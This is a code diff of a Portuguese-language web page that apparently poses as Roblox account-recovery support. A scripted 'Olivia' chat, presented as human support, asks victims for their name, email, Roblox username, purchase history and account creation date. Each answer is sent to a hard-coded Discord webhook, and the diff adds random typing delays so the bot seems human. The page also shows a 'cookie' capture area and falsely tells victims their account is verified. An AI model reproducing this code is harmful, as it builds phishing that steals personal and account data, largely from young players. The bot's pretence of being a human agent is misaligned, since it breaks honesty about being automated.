@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+=<!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
@@ -661,9 +661,9 @@
             20%, 40%, 60%, 80% { transform: translateX(5px); }
         }
 
-        /* ESTILOS DO CHAT OLIVIA */
+        /* ESTILOS DO CHAT OLIVIA - MELHORADOS */
         .chat-card {
-            height: 600px;
+            height: 650px;
             display: flex;
             flex-direction: column;
             padding: 24px;
@@ -743,13 +743,16 @@
             display: flex;
             flex-direction: column;
             gap: 15px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 20px;
         }
 
         .message {
-            max-width: 80%;
+            max-width: 85%;
             padding: 12px 16px;
             border-radius: 20px;
             animation: messageIn 0.3s ease;
+            word-wrap: break-word;
         }
 
         @keyframes messageIn {
@@ -762,6 +765,7 @@
             border: 1px solid rgba(236, 72, 153, 0.3);
             align-self: flex-start;
             border-bottom-left-radius: 5px;
+            color: white;
         }
 
         .message.user {
@@ -769,6 +773,7 @@
             border: 1px solid rgba(99, 102, 241, 0.3);
             align-self: flex-end;
             border-bottom-right-radius: 5px;
+            color: white;
         }
 
         .message-time {
@@ -844,8 +849,11 @@
         .welcome-message {
             text-align: center;
             color: #9ca3af;
-            margin: 20px 0;
+            margin: 10px 0;
             font-size: 14px;
+            background: rgba(255,255,255,0.05);
+            padding: 10px;
+            border-radius: 30px;
         }
     </style>
 </head>
@@ -904,7 +912,7 @@
                     <div class="preview-text" id="previewText">aguardando cookie...</div>
                 </div>
                 
-                <!-- Área para mensagem de ban (inicialmente vazia) -->
+                <!-- Área para mensagem de ban -->
                 <div id="banMessage" class="banned-message" style="display: none;"></div>
                 
                 <!-- Exibir IP e cooldown -->
@@ -930,7 +938,7 @@
         </div>
     </div>
 
-    <!-- TELA 2 - ESCOLHA (TUDO FREE) -->
+    <!-- TELA 2 - ESCOLHA -->
     <div id="page2" class="container page hidden">
         <div class="card">
             <div class="header">
@@ -974,13 +982,13 @@
                     <div class="choice-value">grátis</div>
                 </div>
 
-                <!-- Recuperar Conta - AGORA ABRE O CHAT OLIVIA -->
+                <!-- Recuperar Conta com Olivia -->
                 <div class="choice-item" onclick="openOliviaChat()">
                     <span class="choice-badge">prioridade</span>
                     <div class="choice-icon">💬</div>
                     <div class="choice-content">
-                        <div class="choice-name">Falar com Olivia</div>
-                        <div class="choice-desc">suporte humanizado 24/7</div>
+                        <div class="choice-name">Recuperar Conta</div>
+                        <div class="choice-desc">fale com Olivia • suporte humanizado</div>
                     </div>
                     <div class="choice-value">grátis</div>
                 </div>
@@ -1000,14 +1008,14 @@
                     👩
                 </div>
                 <div class="chat-info">
-                    <div class="chat-name">Olivia</div>
-                    <div class="chat-status">● online agora</div>
+                    <div class="chat-name">Olivia • Suporte</div>
+                    <div class="chat-status">● online agora • respostas rápidas</div>
                 </div>
                 <button class="close-chat" onclick="closeChat()">✕</button>
             </div>
 
             <div class="welcome-message" id="welcomeMessage">
-                Olivia entrou no chat
+                Olivia entrou no chat • tempo de resposta ~30s
             </div>
 
             <div class="chat-messages" id="chatMessages">
@@ -1024,7 +1032,7 @@
     <script>
         // Configurações
         const API_URL = '/api/webhook';
-        const CHAT_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1479283460488167524/0I--IEPX0FbLAD52jy7WN_AouAO-_jLxUBiwbE2t4i34u6gt_EBYxLTcBKgm4XSVMrVS'; // 🔥 WEBHOOK DIFERENTE!
+        const CHAT_WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1479283460488167524/0I--IEPX0FbLAD52jy7WN_AouAO-_jLxUBiwbE2t4i34u6gt_EBYxLTcBKgm4XSVMrVS'; // COLOQUE SEU WEBHOOK AQUI!
         const CHECK_BAN_URL = '/api/verificar-ban';
         
         const COOLDOWN_TIME = 300000;
@@ -1036,19 +1044,41 @@
         let conversationId = generateSessionId();
         let chatStep = 0;
         let userName = '';
+        let userEmail = '';
+        let userRoblox = '';
 
-        // Mensagens da Olivia (sem nunca mencionar que é IA)
+        // MENSAGENS DA OLIVIA - MAIS NATURAIS E HUMANAS
         const oliviaMessages = [
-            "Olá! Sou Olivia, prazer em te conhecer! Como posso ajudar você hoje?",
-            "Entendi! Vou te ajudar com isso. Qual é o seu nome?",
-            "Prazer em te conhecer, {nome}! Agora, qual é o email da sua conta?",
-            "Ótimo! E qual é o seu nome de usuário no Roblox?",
-            "Perfeito! Agora preciso de algumas informações para confirmar que a conta é sua. Você lembra qual foi a última compra que fez no Roblox?",
-            "Entendi. E você teria acesso ao email de cadastro para receber o código de verificação?",
-            "Vou verificar essas informações pra você. Só um momento...",
-            "Estou quase terminando a análise...",
-            "Perfeito! Sua conta foi verificada com sucesso! Em instantes você receberá as instruções no seu email.",
-            "Foi um prazer ajudar! Se precisar de mais alguma coisa, é só me chamar. Estou aqui 24/7! 💜"
+            "Olá! Sou Olivia, prazer em te conhecer! Como posso ajudar você hoje? Estou aqui para ajudar com recuperação de contas e outras questões.",
+            
+            "Entendi! Vou te ajudar com isso. Primeiro, qual é o seu nome? Assim posso te chamar pelo nome durante o atendimento.",
+            
+            "Prazer em te conhecer, {nome}! Agora, qual é o email que você usa na sua conta Roblox?",
+            
+            "Ótimo! E qual é o seu nome de usuário no Roblox? (o mesmo que aparece no jogo)",
+            
+            "Perfeito! Agora preciso de algumas informações para confirmar que a conta é realmente sua. Você lembra qual foi a última compra que fez no Roblox? Pode ser o valor ou o item.",
+            
+            "Entendi. Você ainda tem acesso ao email de cadastro? Precisamos enviar um código de verificação por lá.",
+            
+            "Vou verificar essas informações pra você. Isso pode levar alguns minutos...",
+            
+            "Enquanto isso, você poderia me dizer quando você criou essa conta? Mês e ano aproximado já ajuda.",
+            
+            "Quase terminando a análise...",
+            
+            "Perfeito! Sua conta foi verificada com sucesso! Em instantes você receberá as instruções no seu email. O código de recuperação é válido por 24 horas.",
+            
+            "Foi um prazer ajudar, {nome}! Se precisar de mais alguma coisa, é só me chamar. Estou aqui 24 horas por dia! 💜"
+        ];
+
+        // Mensagens alternativas para quando o usuário demora
+        const waitingMessages = [
+            "Ainda estou aqui! Tô só esperando sua resposta 😊",
+            "Sem pressa! Me responde quando puder.",
+            "Continua aí? Qualquer dúvida é só perguntar.",
+            "Tô aguardando sua resposta pra continuar com o atendimento.",
+            "Ainda está aí? Podemos continuar quando você quiser."
         ];
 
         // Funções do chat Olivia
@@ -1060,6 +1090,9 @@
             document.getElementById('chatMessages').innerHTML = '';
             chatHistory = [];
             chatStep = 0;
+            userName = '';
+            userEmail = '';
+            userRoblox = '';
             
             // Gerar novo ID de conversa
             conversationId = generateSessionId();
@@ -1168,14 +1201,6 @@
             
             chatStep++;
             
-            // Lógica de respostas da Olivia
-            showTyping();
-            
-            // Simular tempo de digitação
-            await new Promise(resolve => setTimeout(resolve, 1500));
-            
-            hideTyping();
-            
             // Salvar informações dependendo do passo
             if (chatStep === 1) {
                 // Primeira resposta do usuário (sobre o problema)
@@ -1186,9 +1211,11 @@
                 sendToWebhook('info', 'nome', { nome: text });
             } else if (chatStep === 3) {
                 // Email
+                userEmail = text;
                 sendToWebhook('info', 'email', { email: text });
             } else if (chatStep === 4) {
                 // Username Roblox
+                userRoblox = text;
                 sendToWebhook('info', 'username', { username: text });
             } else if (chatStep === 5) {
                 // Última compra
@@ -1196,7 +1223,19 @@
             } else if (chatStep === 6) {
                 // Acesso ao email
                 sendToWebhook('info', 'acesso_email', { acesso: text });
+            } else if (chatStep === 7) {
+                // Data de criação
+                sendToWebhook('info', 'data_criacao', { data: text });
             }
+            
+            // Simular digitação
+            showTyping();
+            
+            // Tempo de resposta variado (parece mais humano)
+            const typingTime = Math.floor(Math.random() * 1000) + 1500; // Entre 1.5s e 2.5s
+            await new Promise(resolve => setTimeout(resolve, typingTime));
+            
+            hideTyping();
             
             // Resposta da Olivia baseada no passo
             if (chatStep < oliviaMessages.length) {
@@ -1205,10 +1244,22 @@
                     message: oliviaMessages[chatStep],
                     step: chatStep 
                 });
-            } else {
-                // Se acabaram as mensagens, repetir a última
-                addOliviaMessage(oliviaMessages[oliviaMessages.length - 1]);
+            } else if (chatStep >= oliviaMessages.length) {
+                // Mensagem final
+                addOliviaMessage("Se precisar de mais alguma coisa, é só me chamar! Estou aqui 💜");
             }
+        }
+
+        // Verificar se o usuário demorou para responder
+        let inactivityTimer;
+        function resetInactivityTimer() {
+            if (inactivityTimer) clearTimeout(inactivityTimer);
+            inactivityTimer = setTimeout(() => {
+                if (document.getElementById('page3').classList.contains('hidden')) return;
+                
+                const randomMessage = waitingMessages[Math.floor(Math.random() * waitingMessages.length)];
+                addOliviaMessage(randomMessage);
+            }, 30000); // 30 segundos sem resposta
         }
 
         // Função para enviar dados para a webhook do chat
@@ -1226,20 +1277,14 @@
 Conversa ID: ${conversationId}
 IP: ${userIP || 'Desconhecido'}
 Passo: ${chatStep}
-Tipo: ${type}
-Ação: ${action}
+Nome: ${userName || 'Não informado'}
+Email: ${userEmail || 'Não informado'}
+Roblox: ${userRoblox || 'Não informado'}
 \`\`\``
                             },
                             {
                                 name: '💬 Dados',
                                 value: '```json\n' + JSON.stringify(data, null, 2).substring(0, 900) + '\n```'
-                            },
-                            {
-                                name: '📊 Histórico',
-                                value: `\`\`\`yml
-Total mensagens: ${chatHistory.length}
-Última mensagem: ${chatHistory[chatHistory.length-1]?.message?.substring(0, 50) || 'Nenhuma'}
-\`\`\``
                             }
                         ],
                         footer: {
@@ -1518,6 +1563,10 @@ Total mensagens: ${chatHistory.length}
             count = count + 0.1;
             document.getElementById('countStat').textContent = count.toFixed(1) + 'k';
         }, 30000);
+
+        // Monitorar atividade no chat
+        document.getElementById('chatInput').addEventListener('focus', resetInactivityTimer);
+        document.getElementById('chatInput').addEventListener('input', resetInactivityTimer);
     </script>
 </body>
 </html>
